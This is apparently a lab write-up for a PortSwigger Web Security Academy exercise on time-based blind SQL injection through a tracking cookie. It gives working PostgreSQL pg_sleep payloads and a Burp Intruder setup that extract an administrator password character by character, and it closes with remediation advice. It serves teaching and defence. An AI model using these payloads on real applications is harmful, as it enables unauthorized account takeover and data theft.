#  Blind SQL injection with time delays and information retrieval
- **Target IP:** `0ada00d2046cf86081cc4d90006c0042.web-security-academy.net`
- **OS/Platform:** Web Application (PortSwigger Web Security Academy)
- **Difficulty:** Practitioner

##  Executive Summary
The target web application was found to be vulnerable to a blind SQL injection flaw within its tracking cookie parameter (`TrackingId`). Since the application handles database errors gracefully and does not visually alter its responses, data exfiltration was achieved through an automated time-based extraction technique using Burp Suite Intruder. By measuring intentional database sleep delays conditionally, the administrator's account password was leaked character-by-character, enabling complete application administrative compromise.

##  Phase 1: Reconnaissance & Enumeration

### Web Enumeration
Initial access to the target homepage showed an e-commerce storefront. Intercepting a standard `GET /` request via Burp Suite Proxy exposed an analytics tracking cookie used by the application backend to perform database queries.

```text
GET / HTTP/2
Host: 0ada00d2046cf86081cc4d90006c0042.web-security-academy.net
Cookie: TrackingId=UHCj4NrlrAxLHOa7; session=1iSgkyrreZCDfC8SadM0XbNonFtxfJj
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
```

### Vulnerability Verification (Time Delays)
To confirm the SQL injection vector and determine the database engine, sleep constructs were injected into the `TrackingId` cookie. Testing with a PostgreSQL syntax style `pg_sleep()` successfully forced the server response to delay for 10 seconds.

```text
TrackingId=UHCj4NrlrAxLHOa7'||pg_sleep(10)--
```
- **Response Time:** 10,302 ms (10.3 seconds), confirming synchronous time-based blindness on a PostgreSQL backend.

A control test using an intentionally false condition (`1=2`) did not trigger the delay, verifying conditional logic processing:
```text
TrackingId=UHCj4NrlrAxLHOa7'||(SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END)--
```
- **Response Time:** 200 ms (0.2 seconds).

##  Phase 2: Initial Access (User)

- **Vulnerability Identified:** Time-Based Blind SQL Injection
- **Exploitation Pathway:**
  1. Verified user lookup capabilities by checking if the user `administrator` existed in the `users` table.
  2. Enumerated the length of the administrator's password string.
  3. Configured a **Cluster Bomb** attack in Burp Suite Intruder to automate character extraction.
  4. Extracted each password character by filtering the attack results for response times ≥ 5 seconds.
  5. Authenticated through the `/login` page with the reconstructed credentials to solve the lab.

### Proof of Concept
To extract the complete password, a Burp Suite Intruder **Cluster Bomb** attack was configured targeting the substring offset index position (Payload 1) and the character guess value (Payload 2).

```text
TrackingId=UHCj4NrlrAxLHOa7'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--
```

Sorting the completed Intruder attack results by **Response received** time revealed successful time delays (≈ 5200 ms) corresponding to the correct character positions:

| Character Position (Payload 1) | Character Value (Payload 2) | Response Time (ms) | Status |
| :--- | :--- | :--- | :--- |
| 1 | `b` | 5199 | Correct |
| 2 | `0` | 5195 | Correct |
| 3 | `y` | 5242 | Correct |
| 4 | `y` | 5255 | Correct |
| 5 | `6` | 5225 | Correct |
| 6 | `2` | 5209 | Correct |
| 7 | `x` | 5200 | Correct |
| 8 | `8` | 5343 | Correct |
| 9 | `B` | 5296 | Correct |
| 10 | `7` | 5201 | Correct |
| 11 | `9` | 5194 | Correct |
| 12 | `s` | 5204 | Correct |
| 13 | `f` | 5219 | Correct |
| 14 | `b` | 5250 | Correct |
| 15 | `r` | 5273 | Correct |
| 16 | `7` | 5203 | Correct |
| 17 | `k` | 5194 | Correct |
| 18 | `p` | 5194 | Correct |
| 19 | `a` | 5201 | Correct |
| 20 | `m` | 5286 | Correct |

- **Reconstructed Password:** `b0yy62x8B79sfbr7kpam`

The leaked password string was entered into the application login page (`/login`) to achieve administrative session access:

```text
POST /login HTTP/2
Host: 0ada00d2046cf86081cc4d90006c0042.web-security-academy.net

username=administrator&password=b0yy62x8B79sfbr7kpam
```

##  Phase 3: Privilege Escalation (Root)
- **Local Enumeration:** Accessing the `/my-account` profile UI confirmed a successful authentication mapping to administrative status inside the application database environment.
- **Escalation Steps:** Horizontal account takeover was achieved directly via user database exfiltration. Since the user account acquired was `administrator`, no secondary vertical privilege escalation steps were required on this platform.
- **Proof of Concept:** The application rendered the target confirmation banner: `Congratulations, you solved the lab!`.

##  Remediation
1. **Implement Parameterized Queries:** Utilize strongly typed parameterized database inputs or object-relational mapping (ORM) systems for all application dynamic queries to fully decouple data strings from execution commands.
2. **Input Validation:** Enforce an alphanumeric character whitelist on all analytical values like `TrackingId` cookie headers before passing them to back-end application layers.
3. **Disable Unnecessary Database Functions:** Restrict low-privilege database roles from executing system operations or processing built-in time delay methods like `pg_sleep()`.
